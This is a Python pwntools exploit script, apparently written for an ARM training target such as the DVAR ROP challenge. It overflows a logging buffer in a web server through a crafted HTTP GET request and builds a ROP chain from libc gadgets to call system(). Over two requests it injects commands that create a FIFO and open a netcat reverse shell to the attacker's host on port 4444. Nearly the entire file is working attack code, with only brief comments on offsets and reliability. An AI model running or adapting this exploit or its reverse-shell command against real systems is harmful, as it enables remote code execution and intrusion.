#! /usr/bin/python

from pwn import *
import socket

context.arch='arm'
context.bits=32
context.terminal='sh'

HOST = "192.168.192.128"
PORT = 80
LHOST = socket.gethostbyname(socket.gethostname())
LPORT = 4444

# From disassembly, we can see that the log string is written
# to base $sp+4+216, and $lr is stored at $sp+4 (push {r11, lr}),
# so total overwrite needed is 220 (which includes 4 bytes for address), so 216 
BUFFER_OFFSET = 216

# https://security.stackexchange.com/questions/53345/can-pipe-shell-nc-pipe-achieve-remote-shell
# Tip to replace spaces with tabs from https://no-sec.net/writeup-dvar-rop-challenge/
SHELL_CMD1 = 'rm -f /tmp/f;mkfifo /tmp/f'
SHELL_CMD1 = SHELL_CMD1.replace(' ', '\t') + ';#'
SHELL_CMD2 = 'cat /tmp/f|/bin/sh -i 2>&1|nc %s %i >/tmp/f' % (LHOST,LPORT)
SHELL_CMD2 = SHELL_CMD2.replace(' ', '\t') + ';#'

# GET request requires / to be parsed correctly
# Format of the string that overwrites lr from binary
# This string will get written followed by our crafted GET request
log_str = "Connection from {}, request = \"GET /"
LOG_STR_LEN = len(log_str.format(LHOST))

GET_REQUEST = "GET /{} HTTP/1.0\n\n"

LIBC_BASE = 0x40000000
SYSTEM_ADDR = 0x00010d88

def has_bad_chars( payload ):
    bar = bytearray(payload)
    for c in [ '\x00', '\x0a', '\x0d', '\x20', '\x3f' ]:
        if c in bar: 
            message = 'Payload contains bad character \'{}\' at offset {}'
            raise SystemExit(message.format(hex(ord(c)), bar.find(c)))
    return payload

def build_payload( SHELL_CMD ):
    payload = ''
    payload += 'Z'*(BUFFER_OFFSET-LOG_STR_LEN)
    # Payload entry point
    payload += p32(LIBC_BASE + 0x00059ae7) # pop {r0, r4, pc};
    payload += 'A'*16 # Log() epilogue adds 16 to sp
    payload += p32(0x0fff0fff) # Add to overflow 
    # Address has bad character so add constant to computed address to overflow once in register
    payload += p32(0xf000f000 + SYSTEM_ADDR + 1)  
    payload += p32(LIBC_BASE + 0x0004b448) # add r0, r0, r4; pop {r4, pc};
    payload += 'AAAA' # Junk for r4
    payload += p32(LIBC_BASE + 0x000390ff) # movs r3, r0; pop {r4, r6, r7, pc};
    payload += 'BBBB' # Junk for r4
    payload += 'CCCC' # Junk for r6
    payload += 'DDDD' # Junk for r7
    payload += p32(LIBC_BASE + 0x00059857) # pop {r0, r2, pc};
    payload += p32(LIBC_BASE + 0x0002410f) # masked addr for mov r0, sp
    payload += p32(0xfffffff0) # mask for r2 for mov r0, sp
    payload += p32(LIBC_BASE + 0x00039c94) # and r0, r0, r2; and r1, r1, r3; pop {r4, r5, r6, r7, pc};
    payload += 'EEEE' # Junk for r4
    payload += p32(LIBC_BASE + 0x0005a447) # pop {r3, pc}; into r5 cleanup r6 off stack
    payload += 'FFFF' # Junk for r6
    payload += 'GGGG' # Junk for r7
    payload += p32(LIBC_BASE + 0x00059a87) # pop {r2, pc};
    payload += p32(LIBC_BASE + 0x00017b75) # pop {r0, r6, pc}; 
    payload += p32(LIBC_BASE + 0x00061a7f) # push {r0, r3, r5, r6}; bx r2; r6 cleanup by by earlier instruction in r5 
    payload += p32(LIBC_BASE + 0x000435ad) # bx r0; to branch to unmasked address
    payload += SHELL_CMD
    return payload

def main():
    # Because we have a size limit on the shellcode we can send, I have split
    # the command injection into two payloads, one to create the FIFO pipe and
    # the other to use it. I haven't been able to figure out a good way to
    # minimize the ROP chain further, because at the end of the day we need to
    # unmask two different addresses and most of the gadgets which allow us to
    # do this have larger than prefered pop {} instructions, plus the reverse
    # shell command is longer than I originally thought I would need. 
    # But everything works reliably, so good enough!

    # Build and send first payload
    payload = build_payload(SHELL_CMD1)
    has_bad_chars( payload )

    sock = remote(HOST, PORT)
    sock.send(GET_REQUEST.format(payload))
    sock.close()

    # Build and send second payload to get shell
    payload = build_payload(SHELL_CMD2)
    has_bad_chars( payload )

    # The exploit works consistently but I think that the use of the fifo pipes
    # is vulnerable to some timing issues, because using the built in pwntools
    # listener as well as netcat -lpnk can both result in erratic and
    # inconsistent connection with the reverse shell. I'm not inclined to spend
    # any more time investigating this because it seems to work 50% of the time,
    # and the exploit itself is not the culprit because it is reliable, the only
    # problem is the reverse shell, sometimes it will give an EOF and terminate
    # the connection early, and sometimes it will not.

    PWN_LISTENER = 0
    if PWN_LISTENER:
        l = listen(LPORT)

    sock = remote(HOST, PORT)
    sock.send(GET_REQUEST.format(payload))

    if PWN_LISTENER:
        shell = l.wait_for_connection()
        shell.interactive()
        shell.close()
    else:
        sock.interactive()
    if PWN_LISTENER:
        l.close()
    sock.close()

if __name__ == '__main__':
    main()
